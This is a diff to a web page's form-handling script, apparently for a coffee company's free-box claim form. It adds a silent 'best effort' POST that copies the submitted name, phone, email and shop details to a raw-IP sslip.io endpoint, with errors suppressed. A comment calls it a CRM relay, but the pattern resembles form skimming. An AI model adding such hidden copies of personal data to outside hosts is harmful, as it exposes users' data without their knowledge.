@@ -148,6 +148,7 @@ footer{max-width:560px;margin:28px auto 0;font-size:12.5px;color:var(--muted);te
 <script>
 (function(){
   var FORM = 'https://docs.google.com/forms/d/e/1FAIpQLSe_Cbdgpspgbr-OYIWRHGcfkVuWrNobT0mvmjLdiqjnUAxw5w/formResponse';
+  var RELAY = 'https://5-161-60-3.sslip.io/claim';
   var ENTRY = { shop:'entry.1944405759', person:'entry.1087760355', phone:'entry.562982928', email:'entry.1264359647', dispenser:'entry.831445292', when:'entry.1577716785', ref:'entry.1120095315' };
   var $ = function(id){ return document.getElementById(id); };
   var ref = '';
@@ -174,6 +175,8 @@ footer{max-width:560px;margin:28px auto 0;font-size:12.5px;color:var(--muted);te
     $('go').disabled = true; $('go').textContent = 'Sending...';
     var body = new URLSearchParams();
     Object.keys(ENTRY).forEach(function(k){ body.append(ENTRY[k], f[k] || ''); });
+    // Copy to the scan relay (logs the claim, alerts the team, feeds Close). Best effort: Google stays the record.
+    try { fetch(RELAY, { method: 'POST', body: JSON.stringify(f), headers: { 'Content-Type': 'text/plain' }, keepalive: true }).catch(function(){}); } catch (e) {}
     fetch(FORM, { method: 'POST', mode: 'no-cors', body: body }).then(function(){ showDone(f); }, function(){
       $('go').disabled = false; $('go').textContent = 'Send me the free box';
       $('err').textContent = 'That did not go through. Please try again, or email sales@commonwealthjoe.com.'; $('err').classList.add('show');
